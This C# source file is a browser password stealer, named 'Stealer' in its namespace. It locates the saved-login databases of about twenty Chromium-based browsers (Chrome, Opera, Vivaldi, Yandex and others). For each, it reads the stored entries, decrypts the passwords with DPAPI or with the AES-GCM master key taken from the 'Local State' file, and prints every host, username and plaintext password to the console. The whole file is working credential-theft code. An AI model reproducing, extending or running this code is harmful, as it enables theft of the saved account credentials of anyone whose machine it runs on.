using Newtonsoft.Json.Linq;
using System;
using System.IO;
using System.Linq;
using System.Text;

namespace Stealer
{
    class Program
    {
        static void Main(string[] args)
        {
            // Path info
            string a_a = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
            string l_a = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\";
            string u_s = "\\User Data\\Default\\Login Data";
            // Browsers list
            string[] chromiumBasedBrowsers = new string[]
            {
                l_a + "Google\\Chrome" + u_s,
                l_a + "Chromium" + u_s,
                a_a + "Opera Software\\Opera Stable\\Login Data",
                l_a + "Google(x86)\\Chrome\\User Data\\Default",
                l_a + "Amigo" + u_s,
                l_a + "Vivaldi" + u_s,
                l_a + "Orbitum" + u_s,
                l_a + "Mail.Ru\\Atom" + u_s,
                l_a + "Kometa" + u_s,
                l_a + "Comodo\\Dragon" + u_s,
                l_a + "Torch" + u_s,
                l_a + "Comodo" + u_s,
                l_a + "360Browser\\Browser" + u_s,
                l_a + "Maxthon3" + u_s,
                l_a + "K-Melon" + u_s,
                l_a + "Sputnik\\Sputnik" + u_s,
                l_a + "Nichrome" + u_s,
                l_a + "CocCoc\\Browser" + u_s,
                l_a + "uCozMedia\\Uran" + u_s,
                l_a + "Chromodo" + u_s,
                l_a + "Yandex\\YandexBrowser" + u_s
            };
            // Search all browsers
            foreach (string browser in chromiumBasedBrowsers)
            {
                if(!File.Exists(browser))
                {
                    Console.WriteLine(browser + " not found");
                    continue;
                }

                Console.WriteLine("\n * Browser: " + browser);

                // Read chrome database
                cSQLite sSQLite = new cSQLite(browser);
                sSQLite.ReadTable("logins");

                for (int i = 0; i < sSQLite.GetRowCount(); i++)
                {
                    // Get data from database
                    string hostname = sSQLite.GetValue(i, 0);
                    string username = sSQLite.GetValue(i, 3);
                    string password = sSQLite.GetValue(i, 5);

                    // If no data => break
                    if (string.IsNullOrEmpty(password))
                    {
                        break;
                    }

                // If Chromium version > 80
                    if (password.StartsWith("v10") || password.StartsWith("v11"))
                    {
                        // Get masterkey location
                        string masterKey, masterKeyPath="";
                        foreach(string l_s in new string[] { "", "\\..", "\\..\\.." } )
                        {
                            masterKeyPath = Path.GetDirectoryName(browser) + l_s + "\\Local State";
                            if (File.Exists(masterKeyPath))
                            {
                                break;
                            } else {
                                masterKeyPath = null;
                                continue;
                            }
                        }
                        // If masterKey location file not found.
                        if (string.IsNullOrEmpty(masterKeyPath))
                        {
                            Console.WriteLine("MasterKey file not found!");
                            break;
                        }

                        masterKey = File.ReadAllText(masterKeyPath);
                        // Decrypt master key
                        JObject json = JObject.Parse(masterKey);
                        masterKey = (string)json["os_crypt"]["encrypted_key"];
                        byte[] keyBytes = Encoding.Default.GetBytes(Encoding.Default.GetString(Convert.FromBase64String(masterKey)).Remove(0, 5));
                        byte[] masterKeyBytes = DPAPI.Decrypt(keyBytes, null, out string _);
                        byte[] bytePassword = Encoding.Default.GetBytes(password).ToArray();
                        // Decrypt password by master-key
                        byte[] iv = bytePassword.Skip(3).Take(12).ToArray(); // From 3 to 15
                        byte[] payload = bytePassword.Skip(15).ToArray(); // from 15 to end
                        string decryptedPassword = AesGcm256.decrypt(payload, masterKeyBytes, iv);
                        // Show credentials
                        Console.WriteLine("\n[PROTECTED BY AES-GCM-256]\nHost: " + hostname + "\nUsername: " + username + "\nPassword: " + decryptedPassword);
                        continue;

                // If Chromium version < 80
                    } else {
                        // Decrypt password
                        string decryptedPassword = Encoding.Default.GetString(DPAPI.Decrypt(Encoding.Default.GetBytes(password), null, out string _));
                        // Show credentials
                        Console.WriteLine("\n[PROTECTED BY DPAPI]\nHost: " + hostname + "\nUsername: " + username + "\nPassword: " + decryptedPassword);
                        continue;
                    }

                }
            }

            // Wait
            Console.ReadLine();
        }
    }
}